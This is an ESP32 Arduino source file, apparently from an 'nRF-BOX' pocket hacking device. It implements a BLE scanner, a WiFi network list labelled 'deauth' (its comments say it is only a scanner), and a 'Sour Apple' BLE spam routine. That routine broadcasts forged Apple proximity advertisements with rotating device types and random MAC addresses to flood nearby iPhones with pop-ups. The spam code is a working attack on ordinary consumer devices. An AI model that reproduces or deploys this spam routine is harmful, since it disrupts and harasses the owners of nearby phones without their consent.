#include "config.h"

bool buttonPressed(uint8_t pin);

// ==================== BLE SCANNER ====================
namespace {
  BLEScan* pBLEScan;
  BLEScanResults* pResults;
  bool bleScanning = false;
  int bleDeviceCount = 0;
  int selectedDevice = 0;
}

class MyAdvertisedDeviceCallbacks: public BLEAdvertisedDeviceCallbacks {
  void onResult(BLEAdvertisedDevice advertisedDevice) {
    // Callback quando encontra dispositivo
  }
};

void bleScanSetup() {
  u8g2.clearBuffer();
  u8g2.drawStr(0, 10, "BLE Scanner");
  u8g2.sendBuffer();
  
  BLEDevice::init("nRF-BOX");
  pBLEScan = BLEDevice::getScan();
  pBLEScan->setActiveScan(true);
  pBLEScan->setInterval(100);
  pBLEScan->setWindow(99);
  
  bleScanning = true;
  pBLEScan->start(5, false);
}

void bleScanLoop() {
  if (bleScanning) {
    pResults = (BLEScanResults*)&pBLEScan->getResults();
    bleDeviceCount = pResults->getCount();
    
    u8g2.clearBuffer();
    u8g2.drawStr(0, 10, "BLE Devices:");
    
    int start = selectedDevice;
    for (int i = 0; i < 5 && (start + i) < bleDeviceCount; i++) {
      BLEAdvertisedDevice dev = pResults->getDevice(start + i);
      String name = dev.getName().c_str();
      if (name.length() == 0) name = "Unknown";
      
      u8g2.setCursor(0, 25 + (i * 10));
      if (start + i == selectedDevice) u8g2.print("> ");
      u8g2.print(name.substring(0, 10));
    }
    
    u8g2.setCursor(0, 60);
    u8g2.print("Encontrados: ");
    u8g2.print(bleDeviceCount);
    u8g2.sendBuffer();
    
    if (buttonPressed(BTN_DOWN) && selectedDevice < bleDeviceCount - 1) selectedDevice++;
    if (buttonPressed(BTN_UP) && selectedDevice > 0) selectedDevice--;
  }
}

// ==================== WIFI DEAUTH (Simplificado) ====================
namespace {
  bool wifiInitialized = false;
  int apCount = 0;
  int selectedAp = 0;
}

void wifiDeauthSetup() {
  u8g2.clearBuffer();
  u8g2.drawStr(0, 10, "WiFi Scan");
  u8g2.sendBuffer();
  
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(100);
  
  apCount = WiFi.scanNetworks();
  wifiInitialized = true;
}

void wifiDeauthLoop() {
  if (!wifiInitialized) return;
  
  u8g2.clearBuffer();
  u8g2.drawStr(0, 10, "Redes WiFi:");
  
  for (int i = 0; i < 5 && i < apCount; i++) {
    u8g2.setCursor(0, 25 + (i * 10));
    if (i == selectedAp) u8g2.print("> ");
    String ssid = WiFi.SSID(i);
    if (ssid.length() > 12) ssid = ssid.substring(0, 12);
    u8g2.print(ssid);
    u8g2.print(" ");
    u8g2.print(WiFi.RSSI(i));
  }
  
  u8g2.setCursor(0, 60);
  u8g2.print("Redes: ");
  u8g2.print(apCount);
  u8g2.sendBuffer();
  
  if (buttonPressed(BTN_DOWN) && selectedAp < apCount - 1) selectedAp++;
  if (buttonPressed(BTN_UP) && selectedAp > 0) selectedAp--;
  
  // Nota: Deauth real requer modo monitor/promiscuo que é restrito no ESP32 Arduino core padrão
  // Esta implementação é um scanner apenas para compatibilidade
}

// ==================== SOUR APPLE (BLE Spam) ====================
namespace {
  BLEAdvertising *pAdvertising;
  bool appleSpamming = false;
  uint8_t packet[17];
}

void sourAppleSetup() {
  u8g2.clearBuffer();
  u8g2.drawStr(0, 10, "Sour Apple");
  u8g2.drawStr(0, 25, "SEL: Iniciar/Parar");
  u8g2.sendBuffer();
  
  BLEDevice::init("");
  BLEServer *pServer = BLEDevice::createServer();
  pAdvertising = pServer->getAdvertising();
  
  // Configura pacote Apple
  packet[0] = 16; // Length
  packet[1] = 0xFF; // Manufacturer
  packet[2] = 0x4C; // Apple ID
  packet[3] = 0x00;
  packet[4] = 0x0F; // Type
  packet[5] = 0x05; // Length
  packet[6] = 0xC1; // Action
}

void sourAppleLoop() {
  if (buttonPressed(BTN_SELECT)) {
    appleSpamming = !appleSpamming;
  }
  
  u8g2.clearBuffer();
  u8g2.drawStr(0, 10, "Sour Apple");
  u8g2.setCursor(0, 30);
  u8g2.print(appleSpamming ? "Status: SPAMMING" : "Status: PARADO");
  u8g2.sendBuffer();
  
  if (appleSpamming) {
    // Rotaciona tipos de dispositivos
    const uint8_t types[] = {0x27, 0x09, 0x02, 0x1e, 0x2b, 0x2d, 0x2f, 0x01, 0x06, 0x20, 0xc0};
    packet[7] = types[random(sizeof(types))];
    
    // Gera MAC aleatório
    esp_bd_addr_t addr;
    for (int i = 0; i < 6; i++) addr[i] = random(256);
    
    BLEAdvertisementData advData;
    advData.addData(std::string((char*)packet, 17));
    
    pAdvertising->setDeviceAddress(addr, BLE_ADDR_TYPE_RANDOM);
    pAdvertising->setAdvertisementData(advData);
    pAdvertising->start();
    delay(20);
    pAdvertising->stop();
    delay(30);
  }
}
